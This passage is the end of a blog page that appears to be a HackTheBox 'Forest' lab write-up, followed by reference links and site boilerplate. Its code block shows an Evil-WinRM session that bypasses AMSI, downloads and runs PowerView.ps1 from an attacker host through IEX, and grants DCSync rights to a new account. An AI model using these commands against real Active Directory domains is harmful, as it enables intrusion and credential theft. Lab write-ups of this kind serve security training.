class="line"><span class="string">        \/                               \/          \/       \/         \/ </span></span><br><span class="line"><span class="string">              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[+] Bypass-4MSI </span></span><br><span class="line"><span class="string">[+] Dll-Loader </span></span><br><span class="line"><span class="string">[+] Donut-Loader </span></span><br><span class="line"><span class="string">[+] Invoke-Binary</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Bypass-4MSI</span></span><br><span class="line"><span class="string">[+] Patched! :D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; IEX(New-Object Net.Webclient).downloadString(&#x27;</span>http://10.10.14.3/PowerView.ps1<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $pass = convertto-securestring &#x27;</span>pkp666!<span class="string">&#x27; -asplain -force</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $cred = new-object system.management.automation.pscredential(&#x27;</span>htb\pkp<span class="string">&#x27;, $pass)</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Add-ObjectACL -PrincipalIdentity pkp -Credential $cred -Rights DCSync</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://yaboygmoney.github.io/htb/forest.html" >https://yaboygmoney.github.io/htb/forest.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VrRCxszh03ffAq531XNyKg" >https://mp.weixin.qq.com/s/VrRCxszh03ffAq531XNyKg<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html" >https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：HackTheBox-Forest</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-07-17 11:31:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/07/hackthebox-forest/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/HackTheBox/">#HackTheBox</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/07/hackthebox-mango/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">HackTheBox-Mango</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/05/nessus8-x%E7%A0%B4%E8%A7%A3/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Nessus8.x破解</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
